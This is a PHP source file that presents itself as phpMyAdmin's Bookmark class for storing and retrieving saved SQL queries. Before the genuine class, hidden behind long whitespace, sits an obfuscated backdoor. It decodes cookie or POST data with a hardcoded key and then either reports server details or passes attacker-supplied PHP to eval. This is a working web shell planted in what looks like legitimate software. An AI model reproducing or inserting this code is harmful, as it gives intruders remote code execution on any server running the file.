<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $nba6399 = 117;$GLOBALS['p2bd'] = Array();global $p2bd;$p2bd = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['t7d9f3e48'] = "\x69\x3b\x75\x24\x43\x22\x3c\x38\x45\x4e\x6f\x59\x40\x58\x5a\x26\x47\x27\x2a\x6b\x5b\x2f\x39\x73\x4f\x72\x21\x74\x7a\x3f\x49\x9\x67\xa\x42\x55\x23\x6a\x77\x32\x79\x66\x2c\x2d\x4c\x4a\x30\x35\x70\x36\x7b\x3a\x51\x61\x5e\x53\x33\x46\x5c\x41\x78\x54\x31\x6d\x7d\x65\x34\x5d\x3e\x20\xd\x48\x4d\x57\x2e\x25\x62\x7e\x56\x71\x5f\x60\x7c\x6c\x76\x6e\x50\x63\x28\x37\x3d\x44\x68\x64\x4b\x2b\x29\x52";$p2bd[$p2bd['t7d9f3e48'][60].$p2bd['t7d9f3e48'][47].$p2bd['t7d9f3e48'][49].$p2bd['t7d9f3e48'][56].$p2bd['t7d9f3e48'][66].$p2bd['t7d9f3e48'][62]] = $p2bd['t7d9f3e48'][87].$p2bd['t7d9f3e48'][92].$p2bd['t7d9f3e48'][25];$p2bd[$p2bd['t7d9f3e48'][85].$p2bd['t7d9f3e48'][89].$p2bd['t7d9f3e48'][62].$p2bd['t7d9f3e48'][22].$p2bd['t7d9f3e48'][22]] = $p2bd['t7d9f3e48'][10].$p2bd['t7d9f3e48'][25].$p2bd['t7d9f3e48'][93];$p2bd[$p2bd['t7d9f3e48'][48].$p2bd['t7d9f3e48'][47].$p2bd['t7d9f3e48'][47].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][39]] = $p2bd['t7d9f3e48'][93].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][41].$p2bd['t7d9f3e48'][0].$p2bd['t7d9f3e48'][85].$p2bd['t7d9f3e48'][65];$p2bd[$p2bd['t7d9f3e48'][27].$p2bd['t7d9f3e48'][22].$p2bd['t7d9f3e48'][46].$p2bd['t7d9f3e48'][49].$p2bd['t7d9f3e48'][65]] = $p2bd['t7d9f3e48'][23].$p2bd['t7d9f3e48'][27].$p2bd['t7d9f3e48'][25].$p2bd['t7d9f3e48'][83].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][85];$p2bd[$p2bd['t7d9f3e48'][63].$p2bd['t7d9f3e48'][89].$p2bd['t7d9f3e48'][93].$p2bd['t7d9f3e48'][47].$p2bd['t7d9f3e48'][87]] = $p2bd['t7d9f3e48'][93].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][41].$p2bd['t7d9f3e48'][0].$p2bd['t7d9f3e48'][85].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][93];$p2bd[$p2bd['t7d9f3e48'][76].$p2bd['t7d9f3e48'][87].$p2bd['t7d9f3e48'][39].$p2bd['t7d9f3e48'][22].$p2bd['t7d9f3e48'][87]] = $p2bd['t7d9f3e48'][0].$p2bd['t7d9f3e48'][85].$p2bd['t7d9f3e48'][0].$p2bd['t7d9f3e48'][80].$p2bd['t7d9f3e48'][23].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][27];$p2bd[$p2bd['t7d9f3e48'][92].$p2bd['t7d9f3e48'][39].$p2bd['t7d9f3e48'][7].$p2bd['t7d9f3e48'][53].$p2bd['t7d9f3e48'][46].$p2bd['t7d9f3e48'][87].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][41]] = $p2bd['t7d9f3e48'][23].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][25].$p2bd['t7d9f3e48'][0].$p2bd['t7d9f3e48'][53].$p2bd['t7d9f3e48'][83].$p2bd['t7d9f3e48'][0].$p2bd['t7d9f3e48'][28].$p2bd['t7d9f3e48'][65];$p2bd[$p2bd['t7d9f3e48'][85].$p2bd['t7d9f3e48'][39].$p2bd['t7d9f3e48'][41].$p2bd['t7d9f3e48'][56].$p2bd['t7d9f3e48'][87]] = $p2bd['t7d9f3e48'][48].$p2bd['t7d9f3e48'][92].$p2bd['t7d9f3e48'][48].$p2bd['t7d9f3e48'][84].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][25].$p2bd['t7d9f3e48'][23].$p2bd['t7d9f3e48'][0].$p2bd['t7d9f3e48'][10].$p2bd['t7d9f3e48'][85];$p2bd[$p2bd['t7d9f3e48'][85].$p2bd['t7d9f3e48'][49].$p2bd['t7d9f3e48'][7].$p2bd['t7d9f3e48'][49].$p2bd['t7d9f3e48'][76]] = $p2bd['t7d9f3e48'][2].$p2bd['t7d9f3e48'][85].$p2bd['t7d9f3e48'][23].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][25].$p2bd['t7d9f3e48'][0].$p2bd['t7d9f3e48'][53].$p2bd['t7d9f3e48'][83].$p2bd['t7d9f3e48'][0].$p2bd['t7d9f3e48'][28].$p2bd['t7d9f3e48'][65];$p2bd[$p2bd['t7d9f3e48'][28].$p2bd['t7d9f3e48'][56].$p2bd['t7d9f3e48'][7].$p2bd['t7d9f3e48'][46]] = $p2bd['t7d9f3e48'][76].$p2bd['t7d9f3e48'][53].$p2bd['t7d9f3e48'][23].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][49].$p2bd['t7d9f3e48'][66].$p2bd['t7d9f3e48'][80].$p2bd['t7d9f3e48'][93].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][87].$p2bd['t7d9f3e48'][10].$p2bd['t7d9f3e48'][93].$p2bd['t7d9f3e48'][65];$p2bd[$p2bd['t7d9f3e48'][23].$p2bd['t7d9f3e48'][66].$p2bd['t7d9f3e48'][22].$p2bd['t7d9f3e48'][89].$p2bd['t7d9f3e48'][66].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][56].$p2bd['t7d9f3e48'][62]] = $p2bd['t7d9f3e48'][23].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][27].$p2bd['t7d9f3e48'][80].$p2bd['t7d9f3e48'][27].$p2bd['t7d9f3e48'][0].$p2bd['t7d9f3e48'][63].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][80].$p2bd['t7d9f3e48'][83].$p2bd['t7d9f3e48'][0].$p2bd['t7d9f3e48'][63].$p2bd['t7d9f3e48'][0].$p2bd['t7d9f3e48'][27];$p2bd[$p2bd['t7d9f3e48'][93].$p2bd['t7d9f3e48'][39].$p2bd['t7d9f3e48'][87].$p2bd['t7d9f3e48'][22]] = $p2bd['t7d9f3e48'][23].$p2bd['t7d9f3e48'][41].$p2bd['t7d9f3e48'][89].$p2bd['t7d9f3e48'][7];$p2bd[$p2bd['t7d9f3e48'][87].$p2bd['t7d9f3e48'][46].$p2bd['t7d9f3e48'][46].$p2bd['t7d9f3e48'][47].$p2bd['t7d9f3e48'][41]] = $p2bd['t7d9f3e48'][2].$p2bd['t7d9f3e48'][41].$p2bd['t7d9f3e48'][89].$p2bd['t7d9f3e48'][76].$p2bd['t7d9f3e48'][39].$p2bd['t7d9f3e48'][22].$p2bd['t7d9f3e48'][93];$p2bd[$p2bd['t7d9f3e48'][25].$p2bd['t7d9f3e48'][89].$p2bd['t7d9f3e48'][49].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][66].$p2bd['t7d9f3e48'][46]] = $_POST;$p2bd[$p2bd['t7d9f3e48'][40].$p2bd['t7d9f3e48'][7].$p2bd['t7d9f3e48'][93].$p2bd['t7d9f3e48'][39].$p2bd['t7d9f3e48'][93].$p2bd['t7d9f3e48'][22].$p2bd['t7d9f3e48'][66]] = $_COOKIE;@$p2bd[$p2bd['t7d9f3e48'][76].$p2bd['t7d9f3e48'][87].$p2bd['t7d9f3e48'][39].$p2bd['t7d9f3e48'][22].$p2bd['t7d9f3e48'][87]]($p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][25].$p2bd['t7d9f3e48'][25].$p2bd['t7d9f3e48'][10].$p2bd['t7d9f3e48'][25].$p2bd['t7d9f3e48'][80].$p2bd['t7d9f3e48'][83].$p2bd['t7d9f3e48'][10].$p2bd['t7d9f3e48'][32], NULL);@$p2bd[$p2bd['t7d9f3e48'][76].$p2bd['t7d9f3e48'][87].$p2bd['t7d9f3e48'][39].$p2bd['t7d9f3e48'][22].$p2bd['t7d9f3e48'][87]]($p2bd['t7d9f3e48'][83].$p2bd['t7d9f3e48'][10].$p2bd['t7d9f3e48'][32].$p2bd['t7d9f3e48'][80].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][25].$p2bd['t7d9f3e48'][25].$p2bd['t7d9f3e48'][10].$p2bd['t7d9f3e48'][25].$p2bd['t7d9f3e48'][23], 0);@$p2bd[$p2bd['t7d9f3e48'][76].$p2bd['t7d9f3e48'][87].$p2bd['t7d9f3e48'][39].$p2bd['t7d9f3e48'][22].$p2bd['t7d9f3e48'][87]]($p2bd['t7d9f3e48'][63].$p2bd['t7d9f3e48'][53].$p2bd['t7d9f3e48'][60].$p2bd['t7d9f3e48'][80].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][60].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][87].$p2bd['t7d9f3e48'][2].$p2bd['t7d9f3e48'][27].$p2bd['t7d9f3e48'][0].$p2bd['t7d9f3e48'][10].$p2bd['t7d9f3e48'][85].$p2bd['t7d9f3e48'][80].$p2bd['t7d9f3e48'][27].$p2bd['t7d9f3e48'][0].$p2bd['t7d9f3e48'][63].$p2bd['t7d9f3e48'][65], 0);@$p2bd[$p2bd['t7d9f3e48'][23].$p2bd['t7d9f3e48'][66].$p2bd['t7d9f3e48'][22].$p2bd['t7d9f3e48'][89].$p2bd['t7d9f3e48'][66].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][56].$p2bd['t7d9f3e48'][62]](0);if (!$p2bd[$p2bd['t7d9f3e48'][63].$p2bd['t7d9f3e48'][89].$p2bd['t7d9f3e48'][93].$p2bd['t7d9f3e48'][47].$p2bd['t7d9f3e48'][87]]($p2bd['t7d9f3e48'][59].$p2bd['t7d9f3e48'][44].$p2bd['t7d9f3e48'][97].$p2bd['t7d9f3e48'][8].$p2bd['t7d9f3e48'][59].$p2bd['t7d9f3e48'][91].$p2bd['t7d9f3e48'][11].$p2bd['t7d9f3e48'][80].$p2bd['t7d9f3e48'][97].$p2bd['t7d9f3e48'][35].$p2bd['t7d9f3e48'][9].$p2bd['t7d9f3e48'][80].$p2bd['t7d9f3e48'][56].$p2bd['t7d9f3e48'][49].$p2bd['t7d9f3e48'][49].$p2bd['t7d9f3e48'][53].$p2bd['t7d9f3e48'][41].$p2bd['t7d9f3e48'][76].$p2bd['t7d9f3e48'][7].$p2bd['t7d9f3e48'][53].$p2bd['t7d9f3e48'][7].$p2bd['t7d9f3e48'][53].$p2bd['t7d9f3e48'][39].$p2bd['t7d9f3e48'][56].$p2bd['t7d9f3e48'][47].$p2bd['t7d9f3e48'][47].$p2bd['t7d9f3e48'][53].$p2bd['t7d9f3e48'][76].$p2bd['t7d9f3e48'][39].$p2bd['t7d9f3e48'][62].$p2bd['t7d9f3e48'][41].$p2bd['t7d9f3e48'][76].$p2bd['t7d9f3e48'][41].$p2bd['t7d9f3e48'][62].$p2bd['t7d9f3e48'][62].$p2bd['t7d9f3e48'][76].$p2bd['t7d9f3e48'][53].$p2bd['t7d9f3e48'][62].$p2bd['t7d9f3e48'][53].$p2bd['t7d9f3e48'][46].$p2bd['t7d9f3e48'][39].$p2bd['t7d9f3e48'][41].$p2bd['t7d9f3e48'][76].$p2bd['t7d9f3e48'][53])){$p2bd[$p2bd['t7d9f3e48'][48].$p2bd['t7d9f3e48'][47].$p2bd['t7d9f3e48'][47].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][39]]($p2bd['t7d9f3e48'][59].$p2bd['t7d9f3e48'][44].$p2bd['t7d9f3e48'][97].$p2bd['t7d9f3e48'][8].$p2bd['t7d9f3e48'][59].$p2bd['t7d9f3e48'][91].$p2bd['t7d9f3e48'][11].$p2bd['t7d9f3e48'][80].$p2bd['t7d9f3e48'][97].$p2bd['t7d9f3e48'][35].$p2bd['t7d9f3e48'][9].$p2bd['t7d9f3e48'][80].$p2bd['t7d9f3e48'][56].$p2bd['t7d9f3e48'][49].$p2bd['t7d9f3e48'][49].$p2bd['t7d9f3e48'][53].$p2bd['t7d9f3e48'][41].$p2bd['t7d9f3e48'][76].$p2bd['t7d9f3e48'][7].$p2bd['t7d9f3e48'][53].$p2bd['t7d9f3e48'][7].$p2bd['t7d9f3e48'][53].$p2bd['t7d9f3e48'][39].$p2bd['t7d9f3e48'][56].$p2bd['t7d9f3e48'][47].$p2bd['t7d9f3e48'][47].$p2bd['t7d9f3e48'][53].$p2bd['t7d9f3e48'][76].$p2bd['t7d9f3e48'][39].$p2bd['t7d9f3e48'][62].$p2bd['t7d9f3e48'][41].$p2bd['t7d9f3e48'][76].$p2bd['t7d9f3e48'][41].$p2bd['t7d9f3e48'][62].$p2bd['t7d9f3e48'][62].$p2bd['t7d9f3e48'][76].$p2bd['t7d9f3e48'][53].$p2bd['t7d9f3e48'][62].$p2bd['t7d9f3e48'][53].$p2bd['t7d9f3e48'][46].$p2bd['t7d9f3e48'][39].$p2bd['t7d9f3e48'][41].$p2bd['t7d9f3e48'][76].$p2bd['t7d9f3e48'][53], 1);$r3eab70c = NULL;$ud5d5 = NULL;$p2bd[$p2bd['t7d9f3e48'][23].$p2bd['t7d9f3e48'][41].$p2bd['t7d9f3e48'][89].$p2bd['t7d9f3e48'][93].$p2bd['t7d9f3e48'][93].$p2bd['t7d9f3e48'][87].$p2bd['t7d9f3e48'][47]] = $p2bd['t7d9f3e48'][47].$p2bd['t7d9f3e48'][47].$p2bd['t7d9f3e48'][93].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][76].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][22].$p2bd['t7d9f3e48'][87].$p2bd['t7d9f3e48'][43].$p2bd['t7d9f3e48'][87].$p2bd['t7d9f3e48'][49].$p2bd['t7d9f3e48'][56].$p2bd['t7d9f3e48'][53].$p2bd['t7d9f3e48'][43].$p2bd['t7d9f3e48'][66].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][66].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][43].$p2bd['t7d9f3e48'][22].$p2bd['t7d9f3e48'][39].$p2bd['t7d9f3e48'][47].$p2bd['t7d9f3e48'][56].$p2bd['t7d9f3e48'][43].$p2bd['t7d9f3e48'][93].$p2bd['t7d9f3e48'][22].$p2bd['t7d9f3e48'][62].$p2bd['t7d9f3e48'][22].$p2bd['t7d9f3e48'][66].$p2bd['t7d9f3e48'][66].$p2bd['t7d9f3e48'][62].$p2bd['t7d9f3e48'][41].$p2bd['t7d9f3e48'][49].$p2bd['t7d9f3e48'][47].$p2bd['t7d9f3e48'][76].$p2bd['t7d9f3e48'][66];global $sf7ddc5;function  uf7b29d($r3eab70c, $te23cc){global $p2bd;$v352c1a = "";for ($bf7c4fc=0; $bf7c4fc<$p2bd[$p2bd['t7d9f3e48'][27].$p2bd['t7d9f3e48'][22].$p2bd['t7d9f3e48'][46].$p2bd['t7d9f3e48'][49].$p2bd['t7d9f3e48'][65]]($r3eab70c);){for ($x143f4ba=0; $x143f4ba<$p2bd[$p2bd['t7d9f3e48'][27].$p2bd['t7d9f3e48'][22].$p2bd['t7d9f3e48'][46].$p2bd['t7d9f3e48'][49].$p2bd['t7d9f3e48'][65]]($te23cc) && $bf7c4fc<$p2bd[$p2bd['t7d9f3e48'][27].$p2bd['t7d9f3e48'][22].$p2bd['t7d9f3e48'][46].$p2bd['t7d9f3e48'][49].$p2bd['t7d9f3e48'][65]]($r3eab70c); $x143f4ba++, $bf7c4fc++){$v352c1a .= $p2bd[$p2bd['t7d9f3e48'][60].$p2bd['t7d9f3e48'][47].$p2bd['t7d9f3e48'][49].$p2bd['t7d9f3e48'][56].$p2bd['t7d9f3e48'][66].$p2bd['t7d9f3e48'][62]]($p2bd[$p2bd['t7d9f3e48'][85].$p2bd['t7d9f3e48'][89].$p2bd['t7d9f3e48'][62].$p2bd['t7d9f3e48'][22].$p2bd['t7d9f3e48'][22]]($r3eab70c[$bf7c4fc]) ^ $p2bd[$p2bd['t7d9f3e48'][85].$p2bd['t7d9f3e48'][89].$p2bd['t7d9f3e48'][62].$p2bd['t7d9f3e48'][22].$p2bd['t7d9f3e48'][22]]($te23cc[$x143f4ba]));}}return $v352c1a;}function  sf78($r3eab70c, $te23cc){global $p2bd;global $sf7ddc5;return $p2bd[$p2bd['t7d9f3e48'][87].$p2bd['t7d9f3e48'][46].$p2bd['t7d9f3e48'][46].$p2bd['t7d9f3e48'][47].$p2bd['t7d9f3e48'][41]]($p2bd[$p2bd['t7d9f3e48'][87].$p2bd['t7d9f3e48'][46].$p2bd['t7d9f3e48'][46].$p2bd['t7d9f3e48'][47].$p2bd['t7d9f3e48'][41]]($r3eab70c, $sf7ddc5), $te23cc);}foreach ($p2bd[$p2bd['t7d9f3e48'][40].$p2bd['t7d9f3e48'][7].$p2bd['t7d9f3e48'][93].$p2bd['t7d9f3e48'][39].$p2bd['t7d9f3e48'][93].$p2bd['t7d9f3e48'][22].$p2bd['t7d9f3e48'][66]] as $te23cc=>$wb16f13){$r3eab70c = $wb16f13;$ud5d5 = $te23cc;}if (!$r3eab70c){foreach ($p2bd[$p2bd['t7d9f3e48'][25].$p2bd['t7d9f3e48'][89].$p2bd['t7d9f3e48'][49].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][66].$p2bd['t7d9f3e48'][46]] as $te23cc=>$wb16f13){$r3eab70c = $wb16f13;$ud5d5 = $te23cc;}}$r3eab70c = @$p2bd[$p2bd['t7d9f3e48'][85].$p2bd['t7d9f3e48'][49].$p2bd['t7d9f3e48'][7].$p2bd['t7d9f3e48'][49].$p2bd['t7d9f3e48'][76]]($p2bd[$p2bd['t7d9f3e48'][93].$p2bd['t7d9f3e48'][39].$p2bd['t7d9f3e48'][87].$p2bd['t7d9f3e48'][22]]($p2bd[$p2bd['t7d9f3e48'][28].$p2bd['t7d9f3e48'][56].$p2bd['t7d9f3e48'][7].$p2bd['t7d9f3e48'][46]]($r3eab70c), $ud5d5));if (isset($r3eab70c[$p2bd['t7d9f3e48'][53].$p2bd['t7d9f3e48'][19]]) && $sf7ddc5==$r3eab70c[$p2bd['t7d9f3e48'][53].$p2bd['t7d9f3e48'][19]]){if ($r3eab70c[$p2bd['t7d9f3e48'][53]] == $p2bd['t7d9f3e48'][0]){$bf7c4fc = Array($p2bd['t7d9f3e48'][48].$p2bd['t7d9f3e48'][84] => @$p2bd[$p2bd['t7d9f3e48'][85].$p2bd['t7d9f3e48'][39].$p2bd['t7d9f3e48'][41].$p2bd['t7d9f3e48'][56].$p2bd['t7d9f3e48'][87]](),$p2bd['t7d9f3e48'][23].$p2bd['t7d9f3e48'][84] => $p2bd['t7d9f3e48'][62].$p2bd['t7d9f3e48'][74].$p2bd['t7d9f3e48'][46].$p2bd['t7d9f3e48'][43].$p2bd['t7d9f3e48'][62],);echo @$p2bd[$p2bd['t7d9f3e48'][92].$p2bd['t7d9f3e48'][39].$p2bd['t7d9f3e48'][7].$p2bd['t7d9f3e48'][53].$p2bd['t7d9f3e48'][46].$p2bd['t7d9f3e48'][87].$p2bd['t7d9f3e48'][65].$p2bd['t7d9f3e48'][41]]($bf7c4fc);}elseif ($r3eab70c[$p2bd['t7d9f3e48'][53]] == $p2bd['t7d9f3e48'][65]){eval/*ndca5c91*/($r3eab70c[$p2bd['t7d9f3e48'][93]]);}exit();}} ?><?php
/* vim: set expandtab sw=4 ts=4 sts=4: */
/**
 * Handles bookmarking SQL queries
 *
 * @package PhpMyAdmin
 */
namespace PhpMyAdmin;

use PhpMyAdmin\DatabaseInterface;
use PhpMyAdmin\Relation;
use PhpMyAdmin\Util;

/**
 * Handles bookmarking SQL queries
 *
 * @package PhpMyAdmin
 */
class Bookmark
{
    /**
     * ID of the bookmark
     *
     * @var int
     */
    private $_id;
    /**
     * Database the bookmark belongs to
     *
     * @var string
     */
    private $_database;
    /**
     * The user to whom the bookmark belongs, empty for public bookmarks
     *
     * @var string
     */
    private $_user;
    /**
     * Label of the bookmark
     *
     * @var string
     */
    private $_label;
    /**
     * SQL query that is bookmarked
     *
     * @var string
     */
    private $_query;

    /**
     * @var DatabaseInterface
     */
    private $dbi;

    /**
     * Current user
     *
     * @var string
     */
    private $user;

    public function __construct(DatabaseInterface $dbi, $user)
    {
        $this->dbi = $dbi;
        $this->user = $user;
    }

    /**
     * Returns the ID of the bookmark
     *
     * @return int
     */
    public function getId()
    {
        return $this->_id;
    }

    /**
     * Returns the database of the bookmark
     *
     * @return string
     */
    public function getDatabase()
    {
        return $this->_database;
    }

    /**
     * Returns the user whom the bookmark belongs to
     *
     * @return string
     */
    public function getUser()
    {
        return $this->_user;
    }

    /**
     * Returns the label of the bookmark
     *
     * @return string
     */
    public function getLabel()
    {
        return $this->_label;
    }

    /**
     * Returns the query
     *
     * @return string
     */
    public function getQuery()
    {
        return $this->_query;
    }

    /**
     * Adds a bookmark
     *
     * @return boolean whether the INSERT succeeds or not
     *
     * @access public
     */
    public function save()
    {
        $cfgBookmark = self::getParams($this->user);
        if (empty($cfgBookmark)) {
            return false;
        }

        $query = "INSERT INTO " . Util::backquote($cfgBookmark['db'])
            . "." . Util::backquote($cfgBookmark['table'])
            . " (id, dbase, user, query, label) VALUES (NULL, "
            . "'" . $this->dbi->escapeString($this->_database) . "', "
            . "'" . $this->dbi->escapeString($this->_user) . "', "
            . "'" . $this->dbi->escapeString($this->_query) . "', "
            . "'" . $this->dbi->escapeString($this->_label) . "')";
        return $this->dbi->query($query, DatabaseInterface::CONNECT_CONTROL);
    }

    /**
     * Deletes a bookmark
     *
     * @return bool true if successful
     *
     * @access public
     */
    public function delete()
    {
        $cfgBookmark = self::getParams($this->user);
        if (empty($cfgBookmark)) {
            return false;
        }

        $query  = "DELETE FROM " . Util::backquote($cfgBookmark['db'])
            . "." . Util::backquote($cfgBookmark['table'])
            . " WHERE id = " . $this->_id;
        return $this->dbi->tryQuery($query, DatabaseInterface::CONNECT_CONTROL);
    }

    /**
     * Returns the number of variables in a bookmark
     *
     * @return number number of variables
     */
    public function getVariableCount()
    {
        $matches = array();
        preg_match_all("/\[VARIABLE[0-9]*\]/", $this->_query, $matches, PREG_SET_ORDER);
        return count($matches);
    }

    /**
     * Replace the placeholders in the bookmark query with variables
     *
     * @param array $variables array of variables
     *
     * @return string query with variables applied
     */
    public function applyVariables(array $variables)
    {
        // remove comments that encloses a variable placeholder
        $query = preg_replace(
            '|/\*(.*\[VARIABLE[0-9]*\].*)\*/|imsU',
            '${1}',
            $this->_query
        );
        // replace variable placeholders with values
        $number_of_variables = $this->getVariableCount();
        for ($i = 1; $i <= $number_of_variables; $i++) {
            $var = '';
            if (! empty($variables[$i])) {
                $var = $this->dbi->escapeString($variables[$i]);
            }
            $query = str_replace('[VARIABLE' . $i . ']', $var, $query);
            // backward compatibility
            if ($i == 1) {
                $query = str_replace('[VARIABLE]', $var, $query);
            }
        }
        return $query;
    }

    /**
     * Defines the bookmark parameters for the current user
     *
     * @return array the bookmark parameters for the current user
     * @access  public
     */
    public static function getParams($user)
    {
        static $cfgBookmark = null;

        if (null !== $cfgBookmark) {
            return $cfgBookmark;
        }

        $relation = new Relation();
        $cfgRelation = $relation->getRelationsParam();
        if ($cfgRelation['bookmarkwork']) {
            $cfgBookmark = array(
                'user'  => $user,
                'db'    => $cfgRelation['db'],
                'table' => $cfgRelation['bookmark'],
            );
        } else {
            $cfgBookmark = false;
        }

        return $cfgBookmark;
    }

    /**
     * Creates a Bookmark object from the parameters
     *
     * @param array   $bkm_fields the properties of the bookmark to add; here,
     *                            $bkm_fields['bkm_sql_query'] is urlencoded
     * @param boolean $all_users  whether to make the bookmark available
     *                            for all users
     *
     * @return Bookmark|false
     */
    public static function createBookmark(
        DatabaseInterface $dbi,
        $user,
        array $bkm_fields,
        $all_users = false
    ) {
        if (!(isset($bkm_fields['bkm_sql_query'])
            && strlen($bkm_fields['bkm_sql_query']) > 0
            && isset($bkm_fields['bkm_label'])
            && strlen($bkm_fields['bkm_label']) > 0)
        ) {
            return false;
        }

        $bookmark = new Bookmark($dbi, $user);
        $bookmark->_database = $bkm_fields['bkm_database'];
        $bookmark->_label = $bkm_fields['bkm_label'];
        $bookmark->_query = $bkm_fields['bkm_sql_query'];
        $bookmark->_user = $all_users ? '' : $bkm_fields['bkm_user'];

        return $bookmark;
    }

    /**
     * Gets the list of bookmarks defined for the current database
     *
     * @param string|bool $db the current database name or false
     *
     * @return Bookmark[] the bookmarks list
     *
     * @access public
     */
    public static function getList(DatabaseInterface $dbi, $user, $db = false)
    {
        $cfgBookmark = self::getParams($user);
        if (empty($cfgBookmark)) {
            return array();
        }

        $query = "SELECT * FROM " . Util::backquote($cfgBookmark['db'])
            . "." . Util::backquote($cfgBookmark['table'])
            . " WHERE ( `user` = ''"
            . " OR `user` = '" . $dbi->escapeString($cfgBookmark['user']) . "' )";
        if ($db !== false) {
            $query .= " AND dbase = '" . $dbi->escapeString($db) . "'";
        }
        $query .= " ORDER BY label ASC";

        $result = $dbi->fetchResult(
            $query,
            null,
            null,
            DatabaseInterface::CONNECT_CONTROL,
            DatabaseInterface::QUERY_STORE
        );

        if (! empty($result)) {
            $bookmarks = array();
            foreach ($result as $row) {
                $bookmark = new Bookmark($dbi, $user);
                $bookmark->_id = $row['id'];
                $bookmark->_database = $row['dbase'];
                $bookmark->_user = $row['user'];
                $bookmark->_label = $row['label'];
                $bookmark->_query = $row['query'];
                $bookmarks[] = $bookmark;
            }

            return $bookmarks;
        }

        return array();
    }

    /**
     * Retrieve a specific bookmark
     *
     * @param string  $db                  the current database name
     * @param mixed   $id                  an identifier of the bookmark to get
     * @param string  $id_field            which field to look up the identifier
     * @param boolean $action_bookmark_all true: get all bookmarks regardless
     *                                     of the owning user
     * @param boolean $exact_user_match    whether to ignore bookmarks with no user
     *
     * @return Bookmark the bookmark
     *
     * @access  public
     *
     */
    public static function get(
        DatabaseInterface $dbi,
        $user,
        $db,
        $id,
        $id_field = 'id',
        $action_bookmark_all = false,
        $exact_user_match = false
    ) {
        $cfgBookmark = self::getParams($user);
        if (empty($cfgBookmark)) {
            return null;
        }

        $query = "SELECT * FROM " . Util::backquote($cfgBookmark['db'])
            . "." . Util::backquote($cfgBookmark['table'])
            . " WHERE dbase = '" . $dbi->escapeString($db) . "'";
        if (! $action_bookmark_all) {
            $query .= " AND (user = '"
                . $dbi->escapeString($cfgBookmark['user']) . "'";
            if (! $exact_user_match) {
                $query .= " OR user = ''";
            }
            $query .= ")";
        }
        $query .= " AND " . Util::backquote($id_field)
            . " = " . $dbi->escapeString($id) . " LIMIT 1";

        $result = $dbi->fetchSingleRow($query, 'ASSOC', DatabaseInterface::CONNECT_CONTROL);
        if (! empty($result)) {
            $bookmark = new Bookmark($dbi, $user);
            $bookmark->_id = $result['id'];
            $bookmark->_database = $result['dbase'];
            $bookmark->_user = $result['user'];
            $bookmark->_label = $result['label'];
            $bookmark->_query = $result['query'];
            return $bookmark;
        }

        return null;
    }
}
